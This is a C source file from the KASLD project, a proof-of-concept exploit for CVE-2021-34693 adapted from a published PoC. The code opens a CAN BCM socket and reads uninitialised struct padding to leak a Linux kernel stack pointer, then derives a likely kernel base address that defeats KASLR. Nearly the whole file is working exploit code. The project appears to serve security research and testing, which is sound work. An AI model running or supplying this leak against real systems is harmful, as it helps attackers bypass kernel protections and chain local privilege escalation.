// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel stack pointer from CAN BCM bcm_msg_head struct
// uninitialized 4-byte hole (CVE-2021-34693).
//
// Mostly taken from original PoC by Norbert Slusarek:
// https://www.openwall.com/lists/oss-security/2021/06/15/1/2
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-34693
// https://www.openwall.com/lists/oss-security/2021/06/15/1
// https://www.openwall.com/lists/oss-security/2021/06/15/1/2
// ---
// <bcoles@gmail.com>

#include <fcntl.h>
#include <linux/can.h>
#include <linux/can/bcm.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include "kasld.h"

void rxsetup_sock(int sock) {
  struct sockaddr_can sa;
  struct {
    struct bcm_msg_head b;
    struct canfd_frame f;
  } msg;

  memset(&msg, 0, sizeof(msg));

  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 0;

  msg.b.opcode = RX_SETUP;
  msg.b.flags = CAN_FD_FRAME | SETTIMER | STARTTIMER;
  msg.b.count = 0;
  msg.b.ival1.tv_sec = msg.b.ival2.tv_sec = 0;
  msg.b.ival1.tv_usec = msg.b.ival2.tv_usec = 1;
  msg.b.can_id = 0;
  msg.b.nframes = 1;

  sendto(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, sizeof(sa));
}

unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
  int sock;
  struct sockaddr_can sa;
  struct {
    struct bcm_msg_head b;
    struct canfd_frame f;
  } msg;
  char addrs[9];
  char buf[sizeof(msg)];
  char *endptr;
  unsigned long addr = 0;

  printf("[.] trying bcm_msg_head struct stack pointer leak ...\n");

  sock = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);

  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 0;

  connect(sock, (struct sockaddr *)&sa, sizeof(sa));

  rxsetup_sock(sock);

  memset(&sa, 0, sizeof(sa));
  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  socklen_t len = 0;

  memset(&msg, 0, sizeof(msg));

  recvfrom(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, &len);

  memcpy(buf, &msg, sizeof(buf));

  if (sizeof(buf) < 112)
    return 0;

  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x", buf[39], buf[38], buf[37],
           buf[36]);

  addr = (unsigned long)strtoull(addrs, &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_from_bcm_msg_head_struct();
  if (!addr)
    return 1;

  printf("leaked stack pointer: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

  return 0;
}
